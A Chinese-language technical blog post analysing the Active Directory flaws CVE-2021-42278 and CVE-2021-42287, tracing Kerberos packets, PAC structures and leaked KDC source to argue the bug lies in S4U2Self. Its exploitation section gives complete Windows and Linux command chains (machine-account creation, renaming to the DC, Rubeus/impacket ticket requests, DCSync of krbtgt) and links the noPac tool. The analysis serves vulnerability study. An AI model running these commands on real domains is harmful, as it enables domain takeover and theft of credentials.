---
title: 解析CVE-2021-42278和CVE-2021-42287
tags: 域渗透
---
### 0x00 背景

​	在11月份时，微软发布了几个针对Windows AD域的安全补丁，最受大家关注的以及本文主要讨论的这两个漏洞编号为：`CVE-2021-42278`和`CVE-2021-42287`，可以看到影响版本如下：

![image-20211219234013917](https://images-1258433570.cos.ap-beijing.myqcloud.com/images202112192340049.png)

​	实质上，在`@cube0x0`发布此攻击的武器化工具：`nopac`后，这两个漏洞才真正进入大家视野。在12月12日我也发布文章说明了漏洞的简单原理以及利用方式。

​	一些公众号、星球等，近期发布的文章称`“国内所有的文章所说的原理都是错误的”`，遂又引起了自己的关注。

​	`CVE-2021-42278`涉及的原理方面应该没有什么可以讨论的，而`CVE-2021-42287`，这个漏洞是争议比较大的地方，此文从`CVE-2021-42287`这个有争议的漏洞出发，以Kerberos协议认证过程的几个阶段一步步的来探究大家有争议的地方。

​	**注：阅读本文需要一定的Kerberos认证协议基础和域内账户相关概念基本了解以及对两个漏洞流程有大致的了解。**

### 0x01 CVE-2021-42278 - Name impersonation

​	首先，这一个漏洞非常明了，默认常识情况加入域的主机所创建的机器账户应该由`$`结尾，但存在漏洞的情况下，DC并没有一个对于`sAMAccountName`属性的验证过程，所以我们利用`ms-ds-machineaccountquota`，这一默认的特性就可以创建没有`$`结尾的机器账户。

> ms-ds-machineaccountquota：允许用户在域中创建的计算机帐户数，默认为10
>
> https://docs.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota

### 0x02 CVE-2021-42287 - KDC bamboozling

​	直接抓取攻击成功的数据包进行分析

![image-20211217150307257](https://images-1258433570.cos.ap-beijing.myqcloud.com/images202112171503387.png)

##### 1. AS_REQ阶段

​	这里发出`AS_REQ`请求的账户是一个机器账户，并且名字已经修改为`DC（不携带$）`

​	首先来看`AS_REQ`请求数据包中，除`req-body`的其他字段所代表的意义

![as-req数据包-1](https://images-1258433570.cos.ap-beijing.myqcloud.com/images202112171516803.png)

- PVNO：表示的是Kerberos协议的版本，这里代表使用Kerberos V5
- msg-type：消息类型
- padata：Pre-authentication Data，预身份认证，是 Kerberos V5 协议的扩展点。通过在 AS-REQ 和 AS-REP 消息的 padata 字段中提供一个或多个预认证消息来执行预认证。
  - `PA-DATA PA-ENC-TIMESTAMP`：使用用户hash加密的时间戳，AS收到消息后使用对应hash解密，时间戳在规定范围即认证通过；域内设置`”Do not require Kerberos preauthentication”`，DC不会有Pre-authentication，这里可能出现的安全问题是`AS-REP Roasting`。
  - `PA-DATA PA-PAC-REQUEST`：Privilege Attribute Certificate，用于验证用户是否有权限访问某服务，这里为**开启状态**

​		**注意，这里漏洞利用的这一步所申请的TGT是要求启用PAC的**

​	接着查看`req-body`部分，

​	![req-body](https://images-1258433570.cos.ap-beijing.myqcloud.com/images202112171549396.png)

- kdc-options：请求生成票据的标志位
- cname：进行身份验证的账户名，这里是我们修改后的,为`DC`

​		这里可能出现的安全问题是`kerberos pre-auth`特性枚举域用户

- sname：被请求服务的名字
- etype：加密类型

##### 2. AS_REP阶段

​	首先查看除`ticket->enc-part`中返回的票据部分的关键所有字段代表的意思，部分字段解释过的将略过

![AS_REP](https://images-1258433570.cos.ap-beijing.myqcloud.com/images202112171559027.png)

- ticket：使用krbtgt账户hash加密的部分，用于下一阶段TGS_REQ

​	这里可能出现的安全问题为，获得krbtgt账户hash后可以伪造黄金票据。

- enc-part：请求帐户对应的hash为密钥加密后的值，里面包含session-key，为在下一阶段认证所用到的会话密钥

​	

​	接着返回到`ticket->enc-part`部分，这里我们要重点关注返回TGT中的PAC部分，接下来穿插关于PAC的介绍。

### 0x03 PAC介绍

​	Kerberos协议是最常用的身份验证协议之一，但是Kerberos协议不提供**授权**，Kerberos提供了扩展，通过将授权信息封装在`AuthorizationData`结构中，PAC是为了给kerberos协议扩展提供`AuthorizationData`数据。

![Encapsulation layers](https://images-1258433570.cos.ap-beijing.myqcloud.com/images202112171625140.png)

​	如上图，`AD-IF-RELEVANT`元素是最外层的包装器，它封装了另一个`AD-WIN2K-PAC`类型的`AuthorizationData`元素，在`AD-WIN2K-PAC`结构中最开始包含一个结构叫做`PACTYPE`，这个结构实质上是PAC的最顶层结构，紧随这个结构之后的是若干个`PAC_INFO_BUFFER`结构，这些结构用来指定`PACTYPE`结构后PAC实际内容的指针。

​	下面简单看一下所提到的`PACTYPE`与`PAC_INFO_BUFFER`结构：

#### PACTYPE

​	`PACTYPE`结构是 PAC 的最顶层结构，指定`PAC_INFO_BUFFER`数组中的元素数量。 `PACTYPE`结构用作完整 PAC 数据的标头。

![PACTYPE](https://images-1258433570.cos.ap-beijing.myqcloud.com/images202112171649606.png)

- Buffers：为包含`PAC_INFO_BUFFER`结构的数组
- cBuffers：用于定义 Buffers 数组中的条目数

#### PAC_INFO_BUFFER

在 `PACTYPE`结构之后是一个` PAC_INFO_BUFFER `结构数组，每个结构定义了 PAC 缓冲区的类型和字节偏移量。` PAC_INFO_BUFFER `数组没有定义的顺序。结构如下图：

![PAC_INFO_BUFFER](https://images-1258433570.cos.ap-beijing.myqcloud.com/images202112171652152.png)

- ulType：一个 32 位无符号整数，采用 little-endian格式，用于描述 Offset 处包含的缓冲区中存在的数据类型。

- Offset：一个 64 位无符号整数，采用 little-endian 格式，包含从 PACTYPE 结构开始到缓冲区开头的偏移量。数据偏移必须是八的倍数。

- cbBufferSize ：一个 32 位无符号整数，采用 little-endian 格式，包含 PAC 中位于 Offset 处的缓冲区的大小。

具体的ulType类型如下：

| Value      | Meaning                                                      |
| ---------- | ------------------------------------------------------------ |
| 0x00000001 | Logon information . PAC structures MUST contain one buffer of this type. Additional logon information buffers MUST be ignored. |
| 0x00000002 | Credentials information . PAC structures SHOULD NOT contain more than one buffer of this type, based on constraints specified in section 2.6. Second or subsequent credentials information buffers MUST be ignored on receipt. |
| 0x00000006 | Server checksum . PAC structures MUST contain one buffer of this type. Additional logon server checksum buffers MUST be ignored. |
| 0x00000007 | KDC (privilege server) checksum (section 2.8). PAC structures MUST contain one buffer of this type. Additional KDC checksum buffers MUST be ignored. |
| 0x0000000A | Client name and ticket information . PAC structures MUST contain one buffer of this type. Additional client and ticket information buffers MUST be ignored. |
| 0x0000000B | Constrained delegation information . PAC structures MUST contain one buffer of this type for [Service for User to Proxy (S4U2proxy)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/f2ef15b6-1e9b-48b5-bf0b-019f061d41c8#gt_30e42141-9b8e-4fa1-852e-b4bb996ccf13) [[MS-SFU\]](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/3bff5864-8135-400e-bdd9-33b552051d94) requests and none otherwise. Additional constrained delegation information buffers MUST be ignored. |
| 0x0000000C | User principal name (UPN) and Domain Name System (DNS) information . PAC structures SHOULD NOT contain more than one buffer of this type. Second or subsequent UPN and DNS information buffers MUST be ignored on receipt. |
| 0x0000000D | Client claims information . PAC structures SHOULD NOT contain more than one buffer of this type. Additional client claims information buffers MUST be ignored. |
| 0x0000000E | Device information . PAC structures SHOULD NOT contain more than one buffer of this type. Additional device information buffers MUST be ignored. |
| 0x0000000F | Device claims information . PAC structures SHOULD NOT contain more than one buffer of this type. Additional device claims information buffers MUST be ignored. |
| 0x00000010 | Ticket checksum  PAC structures SHOULD NOT contain more than one buffer of this type. Additional ticket checksum buffers MUST be ignored. |

#### KERB_VALIDATION_INFO

​	我们主要关注`0x00000001`的`KERB_VALIDATION_INFO`结构，定义了 DC 提供的用户登录和授权信息。指向` KERB_VALIDATION_INFO`结构的指针被序列化为字节数组，然后放置在最顶层 `PACTYPE` 结构的 `Buffers 数组`之后

​	PAC主要验证身份的实现就是依靠这个部分

```c++
typedef struct _KERB_VALIDATION_INFO {
   FILETIME LogonTime;
   FILETIME LogoffTime;
   FILETIME KickOffTime;
   FILETIME PasswordLastSet;
   FILETIME PasswordCanChange;
   FILETIME PasswordMustChange;
   RPC_UNICODE_STRING EffectiveName;
   RPC_UNICODE_STRING FullName;
   RPC_UNICODE_STRING LogonScript;
   RPC_UNICODE_STRING ProfilePath;
   RPC_UNICODE_STRING HomeDirectory;
   RPC_UNICODE_STRING HomeDirectoryDrive;
   USHORT LogonCount;
   USHORT BadPasswordCount;
   ULONG UserId;
   ULONG PrimaryGroupId;
   ULONG GroupCount;
   [size_is(GroupCount)] PGROUP_MEMBERSHIP GroupIds;
   ULONG UserFlags;
   USER_SESSION_KEY UserSessionKey;
   RPC_UNICODE_STRING LogonServer;
   RPC_UNICODE_STRING LogonDomainName;
   PISID LogonDomainId;
   ULONG Reserved1[2];
   ULONG UserAccountControl;
   ULONG SubAuthStatus;
   FILETIME LastSuccessfulILogon;
   FILETIME LastFailedILogon;
   ULONG FailedILogonCount;
   ULONG Reserved3;
   ULONG SidCount;
   [size_is(SidCount)] PKERB_SID_AND_ATTRIBUTES ExtraSids;
   PISID ResourceGroupDomainSid;
   ULONG ResourceGroupCount;
   [size_is(ResourceGroupCount)] PGROUP_MEMBERSHIP ResourceGroupIds;
 } KERB_VALIDATION_INFO;
```

​	这个结构中我们主要关注GroupIds这个成员，它为指向` GROUP_MEMBERSHIP`结构列表的指针，该列表包含帐户域中帐户所属的组。

这里**如果可以修改的话那么修改为高权限组即可达到域内账户提权的效果**，比如`MS14-068`。

​	另外`ulType`类型中的`0x00000006`对应的是服务检验和，`0x00000007`对应的是KDC校验和，他们是为了防止PAC内容被篡改。

我们只关注身份授权，所以不探讨其他的先。

##### 2.AS_REP阶段-续

介绍完PAC后，接着回到上述第二部分的2小节中的`ticket->enc-part`部分，看完上述PAC介绍我相信下面的结构会一目了然。

![TGT](https://images-1258433570.cos.ap-beijing.myqcloud.com/images202112171611867.png)

我们重点关注`GroupIds`，可以看到在这个返回的PAC中，赋予给这个账户的PAC中的用于授权的关键的一个标志为515

![PAC_LOGON_INFO](https://images-1258433570.cos.ap-beijing.myqcloud.com/images202112171732595.png)

515为`Domain Computers`组的RID，那么我们可以确定，**到这一步为止，所有的流程还是正常的**，这个PAC中所代表的身份还是我们创建的这个机器账户。

##### 3.TGS_REQ

​	这个阶段的请求包，我们主要关注padata中的部分

![TGS_REQ](https://images-1258433570.cos.ap-beijing.myqcloud.com/images202112171740187.png)

​	展开后如下图

![PA-TGS-REQ](https://images-1258433570.cos.ap-beijing.myqcloud.com/images202112171806390.png)

​	`PA-TGS-REQ->ap-req->ticket`为AS_REP所得到的TGT票据结构`PA-TGS-REQ->ap-req->enc-part`与AS_REP返回的一致

`PA-TGS-REQ->ap-req->authenticator`用于下一步认证使用的会话密钥，通过`session-key`作为密钥加密时间戳，用户名等信息。



​	其次，在`S4U2Self`协议扩展中，Service代表用户请求一个`TGS Ticket`，KDC通过用户名和域名来识别用户，或者还有一种方式是通过证书来识别用户，如果通过用户名和域名来识别用户的话，Service会使用自己的TGT并添加一个新的padata，就是`PA-FOR-USER`结构。

​	这个结构如下：

```C++
    PA-FOR-USER ::= SEQUENCE {
       -- PA TYPE 129
       userName              [0] PrincipalName,
       userRealm              [1] Realm,            
       cksum                 [2] Checksum,             
       auth-package          [3] KerberosString
    }
```

​	其他的参数一目了然，其中第三个`Checksum`是用来保护这个结构不受篡改的。

​	*userName、userRealm 和 auth-package 的校验和。这是使用 KERB_CHECKSUM_HMAC_MD5 函数 计算的。*

​	

​	由于这里是使用`s4u2self`协议去代替机器账户请求一个到cifs服务的`TGS Ticket`，所以我们查看padata部分其实还包含一个`PA-FOR-USER`的结构。

​	可以看到如下图，具有SPN的账户也就是我们的机器账户，是代`Administrator`的身份请求到cifs服务的`TGS Ticket`

![PA-FOR-USER](https://images-1258433570.cos.ap-beijing.myqcloud.com/images202112171829437.png)

​	*到这来看，`KRB_TGS_REQ`消息中传递的 TGT 的请求主体的身份是我们改名后的机器账户`DC`，我们其实这里就已经可以八九不离十的猜测到，这个漏洞就是验证的这一步出现的问题，因为申请TGT后攻击者使这个账户“消失”，TGS找不到这个账户所以自动使用`DC$`的身份去创建服务票证。那么这个高权限账户自然可以做对应的处理。*

##### 4.TGS_REP

​	这里我们主要关注ticket中返回的`TGS Ticket`，这里票据的enc-part是使用请求的服务的密钥加密的，这里可能发生的安全问题成为`白银票据`。同样请求到对应服务的`TGS Ticket`后我们可以爆破服务hash，称为`Kerberoasting`。

![TGS_REP](https://images-1258433570.cos.ap-beijing.myqcloud.com/images202112171858165.png)

​	这里重点关注`TGS Ticket`中的PAC部分

![image-20211217190202340](https://images-1258433570.cos.ap-beijing.myqcloud.com/images202112171902139.png)

继续展开查看`PAC_LOGON_INFO`中的关键点，`KERB_VALIDATION_INFO`结构

![PAC_LOGON_INFO](https://images-1258433570.cos.ap-beijing.myqcloud.com/images202112171903525.png)

​	可以看到关键的字段组的`RID`等，全部是`administrator`身份对应的值，现在这个票据已经是高权限票据了，完全可以正常的通过目标服务与DC之间的PAC授权验证。

​	在`TGS_REQ`与`TGS_REP`消息序列中，Kerberos 主体使用其TGT向服务请求`TGS Ticket`。 **TGS 会使用来自在`KRB_TGS_REQ`消息中传递的 TGT 的请求主体的身份来创建服务票证。**

​	在这里验证我们上述第3小节的猜想，确实是因为对应机器账户名字的更改，致使TGS找不到对应机器账号会在后面添加$号，认为这个就是对应的机器账户，那么DC本身的机器账户肯定有权限创建通过`S4U2Self`申请的`TGS Ticket`。而我们又是通过`S4U2Self`协议对`administrator`域管理员去申请访问`cifs服务`的`TGS Ticket`，回想一下`AS_REP`阶段的TGT内所生成的PAC中的身份其实还是一个“低权身份”，因为**TGS 会使用来自在`KRB_TGS_REQ`消息中传递的 TGT 的请求主体的身份来创建服务票证。**当`TGS`误以为我们的机器账户是DC的机器账户后，创建对应`administrator`的身份的`TGS Ticket`，当然PAC中的身份也是“高权身份”。

​	简单描述一下这个逻辑，其实就是我们要申请Sercive代替`administrator`申请访问任意服务的`TGS Ticket`，那么沿用请求机器账户身份的PAC，从常理来看当然不行，因为这个账户是没有权限访问对应的服务的，TGS肯定要重新生成`TGS Ticket`中的PAC结构，来让这个票据有它要进行S4U2Self的对应账户身份去访问对应的服务。

​	这也就是为什么有些文章中，不使用S4U去请求TGT的情况下是无法利用成功的原因，主要就是S4U2Self这一步的原因。此外，熟悉Kerberos协议的都知道，验证PAC这一步是`AP认证阶段`Service与DC之间的事情。

### 0x04 “源代码”验证

​	为了进一步验证上述结论，查看XP泄露的源代码，定位到代码处：

https://github.com/cryptoAlgorithm/nt5src/blob/daad8a087a4e75422ec96b7911f1df4669989611/Source/XPSP1/NT/ds/security/protocols/kerberos/server/gettgs.cxx#L230

​	这里是处理PAC生成的代码部分，第268行为非S4U请求的处理判断，392行为S4U请求的判断，我们直接对比查看：

​	*篇幅原因我就不贴出全部代码，感兴趣的可以自行点开上述链接查看*

##### 非S4U请求：

​	首先会对`AuthorizationData`做一个解密，回想一下，其实就是对`padata -> ap-req -> ticket->enc-part`，使用krbtgt账户的密钥对加密的票据部分做了解密。

`EncryptedAuthData->TempAuthData->SuppliedAuthData `

![image-20211220005942975](https://images-1258433570.cos.ap-beijing.myqcloud.com/images202112200059773.png)

​		最后拷贝到新的票据中，正常的携带PAC申请TGS Ticket也是这个流程，会沿用最初的PAC身份。

![image-20211220020016357](https://images-1258433570.cos.ap-beijing.myqcloud.com/images202112200200229.png)

`KerbCopyAndAppendAuthData`，拷贝并追加函数的声明

![image-20211220015926114](https://images-1258433570.cos.ap-beijing.myqcloud.com/images202112200159053.png)		

##### S4U请求：

​	会生成对应用户的PAC(`NewPacAuthData`)，然后赋值给`FinalAuthData`

![image-20211220013415099](https://images-1258433570.cos.ap-beijing.myqcloud.com/images202112200134014.png)

​	猜测399行`KdcGetPacAuthData`()，就是取的`PA-FOR-USER`结构中的name

![image-20211220020252924](https://images-1258433570.cos.ap-beijing.myqcloud.com/images202112200202802.png)

​	代码比较多，我直接给出函数定义地址：

`KdcGetS4UTicketInfo()`

https://github.com/cryptoAlgorithm/nt5src/blob/daad8a087a4e75422ec96b7911f1df4669989611/Source/XPSP1/NT/ds/security/protocols/kerberos/server/gettgs.cxx#L54

其中调用的关键函数：`KdcGetTicketInfo()`

https://github.com/cryptoAlgorithm/nt5src/blob/daad8a087a4e75422ec96b7911f1df4669989611/Source/XPSP1/NT/ds/security/protocols/kerberos/server/tktutil.cxx#L54

​	接着之后在444行时，有一个`else if `逻辑，大致是如果没有原始的PAC，就新添加一个PAC，注意，这里是`else if`，其实不会进入这个逻辑做处理，因为已经进入if条件了。

​	在其他文章中所说“若原票据不存在PAC，则会构造一个新的PAC”，个人认为而这里实际上就是S4U新生成了PAC，并且数据包中也实际存在PAC。

​	这里对比一下S4U的`if`逻辑与这个`else if`逻辑，所调用的生成PAC函数：

```c++
        KerbErr = KdcGetPacAuthData(
                     S4UUserInfo,
                     &S4UGroupMembership,
                     TargetServerKey,
                     NULL,                   // no credential key
                     AddResourceGroups,
                     FinalTicket,
                     S4UClientName,
                     &NewPacAuthData,
                     pExtendedError
                     );
```

```c++
            KerbErr = KdcGetPacAuthData(
                        UserInfo,
                        &GroupMembership,
                        TargetServerKey,
                        NULL,                   // no credential key
                        AddResourceGroups,
                        FinalTicket,
                        NULL, // no S4U client
                        &NewPacAuthData,
                        pExtendedError
                        );
```

​	所以这里`else if`中所做的处理应该是对应于非S4U的处理。

​	最后，也就是我上述所说的，并不是`TGS_REQ`中没有携带PAC然后去生成PAC，并且数据包中也确实存在PAC，而是正常的S4U请求就会重新生成对应模拟用户的PAC到Ticket中。

​	**`nopac`所指的应该是所模拟的账户是没有pac的应该要重新生成。**

​	我这一小节的叙述与别的文章有一些出入或存在错误之处，欢迎对这一小节进行讨论交流批评指正。

### 0x05 利用

​	需要对属性`sAMAccountName` and `servicePrincipalName`，具有写权限。说到机器账户，就可以利用域内默认的MAQ特性，默认允许域账户创建10个机器账户，而创建者对于机器账户具有写权限，当然可以更改这两个属性。

 查看MAQ是否有限制，查看LDAP中的`ms-ds-machineaccountquota`属性即可。

攻击流程：

1. 创建一个机器账户，这在之前的文章都有所提及，使用impacket的`addcomputer.py`或是`powermad`

   `addcomputer.py`是利用`SAMR协议`创建机器账户，这个方法所创建的机器账户没有SPN，所以可以不用清除

2. 清除机器账户的`servicePrincipalName`属性

3. 将机器账户的`sAMAccountName`，更改为DC的机器账户名字，注意后缀不带$

4. 为机器账户请求TGT

5. 将机器账户的`sAMAccountName`更改为其他名字，不与步骤3重复即可

6. 通过S4U2self协议向DC请求ST

7. DCsync

**通过用户账户利用的话，需要对用户账户有`GenericAll`的权限还有用户的凭据**

如果可以跨域创建机器账户或是有写权限的话，也可以利用此攻击进行跨域攻击。

##### Windows命令

```cmd
# 0. create a computer account
$password = ConvertTo-SecureString 'ComputerPassword' -AsPlainText -Force
New-MachineAccount -MachineAccount "ControlledComputer" -Password $($password) -Domain "domain.local" -DomainController "DomainController.domain.local" -Verbose

# 1. clear its SPNs
Set-DomainObject "CN=ControlledComputer,CN=Computers,DC=domain,DC=local" -Clear 'serviceprincipalname' -Verbose

# 2. rename the computer (computer -> DC)
Set-MachineAccountAttribute -MachineAccount "ControlledComputer" -Value "DomainController" -Attribute samaccountname -Verbose

# 3. obtain a TGT
Rubeus.exe asktgt /user:"DomainController" /password:"ComputerPassword" /domain:"domain.local" /dc:"DomainController.domain.local" /nowrap

# 4. reset the computer name
Set-MachineAccountAttribute -MachineAccount "ControlledComputer" -Value "ControlledComputer" -Attribute samaccountname -Verbose

# 5. obtain a service ticket with S4U2self by presenting the previous TGT
Rubeus.exe s4u /self /impersonateuser:"DomainAdmin" /altservice:"ldap/DomainController.domain.local" /dc:"DomainController.domain.local" /ptt /ticket:[Base64 TGT]

# 6. DCSync
(mimikatz) lsadump::dcsync /domain:domain.local /kdc:DomainController.domain.local /user:krbtgt 
```

或是Windows下的武器化工具：https://github.com/cube0x0/noPac

##### Linux命令

```
# 0. create a computer account
addcomputer.py -computer-name 'ControlledComputer$' -computer-pass 'ComputerPassword' -dc-host DC01 -domain-netbios domain 'domain.local/user1:complexpassword'

# 1. clear its SPNs
addspn.py -u 'domain\user' -p 'password' -t 'ControlledComputer$' -c DomainController

# 2. rename the computer (computer -> DC)
renameMachine.py -current-name 'ControlledComputer$' -new-name 'DomainController' -dc-ip 'DomainController.domain.local' 'domain.local'/'user':'password'

# 3. obtain a TGT
getTGT.py -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController':'ComputerPassword'

# 4. reset the computer name
renameMachine.py -current-name 'DomainController' -new-name 'ControlledComputer$' 'domain.local'/'user':'password'

# 5. obtain a service ticket with S4U2self by presenting the previous TGT
KRB5CCNAME='DomainController.ccache' getST.py -self -impersonate 'DomainAdmin' -spn 'cifs/DomainController.domain.local' -k -no-pass -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController'

# 6. DCSync by presenting the service ticket
KRB5CCNAME='DomainAdmin.ccache' secretsdump.py -just-dc-user 'krbtgt' -k -no-pass -dc-ip 'DomainController.domain.local' @'DomainController.domain.local'
```

##### 利用延申	

​	如果在限制了MAQ属性的情况下，攻击的核⼼就是需要对⼀个账⼾有写权限，需要找⼀个⽤⼾账⼾，或者是所在的组， 对sAMAccountName有可写的权限；比如说是`Creater-sid`（机器账户的创建者默认对其有写权限）。

```powershell
Get-DomainObjectAcl duck -ResolveGUIDs | ?{$_.SecurityIdentifier -eq (GetDomainUser dog).objectsid}
```

​	寻找限制MAQ时的“加域账⼾”，对应的组策略 privilege就是`SeMachineAccountPrivilege`。

```cmd
adfind -b CN=Computers,DC=test,DC=com -sddl+++ -s base -sdna -sddlfilter ;;"CR CHILD";;;
```

​	其次，在域外没有凭据的情况下，就是要搞⼀个机器账⼾，可以配合webdav、rbcd等等思路进行`NTLM Relay`，然后就是MAQ 限制和不限制两种情况了。

### 0x06 总结

​	本文介绍了`CVE-2021-42278`和`CVE-2021-42287`的漏洞背景，并从协议以及源码角度来分析漏洞成因。并得出结论，这个漏洞出现的原因并不在某些文章所说的PAC。而是在`S4U2Self`的过程中产生的问题，也确实是在`TGS_REP阶段`，也证明了我最早发布的文章并没有描述错误。

​	最后，本文如有描述错误欢迎大家批评指正，一起交流，并且欢迎大家关注微信公众号：`黑客在思考`

### 参考

https://support.microsoft.com/en-us/topic/kb5008102-active-directory-security-accounts-manager-hardening-changes-cve-2021-42278-5975b463-4c95-45e1-831a-d120004e258e

https://support.microsoft.com/en-us/topic/kb5008380-authentication-updates-cve-2021-42287-9dafac11-e0d0-4cb8-959a-143bd0201041

https://www.rfc-editor.org/rfc/rfc4120.txt

https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/ae60c948-fda8-45c2-b1d1-a71b484dd1f7

https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/c38cc307-f3e6-4ed4-8c81-dc550d96223c

https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/aceb70de-40f0-4409-87fa-df00ca145f5a

https://mp.weixin.qq.com/s/Ar8u_gXh2i3GEcqdhOD8wA